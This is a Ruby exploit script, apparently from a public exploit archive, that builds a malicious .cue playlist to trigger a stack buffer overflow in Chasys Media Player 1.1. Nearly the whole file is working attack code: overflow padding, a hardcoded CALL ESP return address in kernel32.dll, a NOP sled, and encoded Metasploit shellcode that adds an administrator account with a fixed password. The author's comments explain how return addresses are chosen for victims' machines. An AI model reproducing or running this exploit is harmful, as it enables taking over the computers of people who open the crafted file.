#!/usr/bin/env ruby
# Chasys Media Player 1.1 .cue file Stack Overflow Exploit
# By Stack
# Mountassif Moad
# cat thnx.txt
# Simo-Soft - Houssamix - Skd - Fl0 fl0w & str0ke :d
#
time3 = Time.new
puts "Exploit Started in Current Time :" + time3.inspect
puts "Enter Name For your File Like : Stack"
files = gets.chomp.capitalize
puts "Name Of File : " + files +'.cue'
time1 = Time.new
$VERBOSE=nil
Header1= "\x5B\x70\x6C\x61\x79\x6C\x69"+
         "\x73\x74\x5D\x0D\x46\x69\x6C"+
   	 "\x65\x31\x3D"
  
  
Header2= "\x0D\x0A\x54\x52\x41\x43\x4B\x20\x30\x31\x20\x4D\x4F\x44\x45\x31\x2F\x32"+
         "\x33\x35\x32\x0D\x0A\x20\x20\x20\x49\x4E\x44\x45\x58\x20\x30\x31"+
         "\x20\x30\x30\x3A\x30\x30\x3A\x30\x30"
  
  
# win32_adduser -  PASS=toor EXITFUNC=seh USER=root Size=489 Encoder=PexAlphaNum http://metasploit.com
Shellscode =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"+
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"+
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"+
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"+
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"+
"\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x38\x4e\x47"+
"\x45\x30\x4a\x57\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x48"+
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x58\x46\x53\x4b\x58"+
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"+
"\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"+
"\x46\x4f\x4b\x33\x46\x45\x46\x42\x46\x50\x45\x57\x45\x4e\x4b\x48"+
"\x4f\x55\x46\x42\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x34"+
"\x4b\x48\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x4b\x48\x4e\x41\x4b\x58"+
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x53"+
"\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x38\x42\x4c\x4a\x57"+
"\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x58\x42\x57\x4e\x41\x4d\x4a"+
"\x4b\x38\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x58\x42\x4b"+
"\x42\x50\x42\x30\x42\x50\x4b\x48\x4a\x46\x4e\x43\x4f\x35\x41\x53"+
"\x48\x4f\x42\x46\x48\x55\x49\x48\x4a\x4f\x43\x48\x42\x4c\x4b\x37"+
"\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x50\x4f\x45\x4a\x36\x4a\x39"+
"\x50\x4f\x4c\x58\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x4d\x46"+
"\x46\x56\x50\x52\x45\x36\x4a\x47\x45\x46\x42\x52\x4f\x32\x43\x46"+
"\x42\x52\x50\x56\x45\x56\x46\x37\x42\x52\x45\x57\x43\x57\x45\x46"+
"\x44\x37\x42\x32\x44\x47\x4f\x46\x4f\x56\x46\x37\x42\x32\x46\x37"+
"\x4f\x36\x4f\x56\x44\x57\x42\x52\x4f\x42\x41\x44\x46\x54\x46\x34"+
"\x42\x52\x48\x52\x48\x52\x42\x32\x50\x56\x45\x36\x46\x37\x42\x52"+
"\x4e\x36\x4f\x46\x43\x56\x41\x56\x4e\x36\x47\x36\x44\x57\x4f\x36"+
"\x45\x57\x42\x47\x42\x52\x41\x34\x46\x46\x4d\x36\x49\x46\x50\x56"+
"\x49\x36\x43\x47\x46\x47\x44\x37\x41\x36\x46\x57\x4f\x56\x44\x57"+
"\x43\x47\x42\x32\x44\x57\x4f\x56\x4f\x46\x46\x47\x42\x32\x4f\x32"+
"\x41\x54\x46\x54\x46\x54\x42\x50\x5a"
Over     = "\x41" * 260
Nop      = "\x90" * 20
Ret      = "\x5D\x38\x82\x7C" # CALL ESP kernel32.dll Sp 2 FR & EN 
   # "\x35\x16\x39\x77" # CALL ESP Universel If box Have .Net 2
   # ( this is my methode if i dont find an universel address in app i find adress
   # in some famouse softwar who the victime 90 % install it )

Xpl = Header1 + Over + Ret + Nop + Shellscode + Header2
File.open( files+".cue", "w" ) do |the_file|
the_file.puts(Xpl)
puts "Exploit finished in Current Time :" + time1.inspect
puts "Now Open " + files +".cue :d"
end
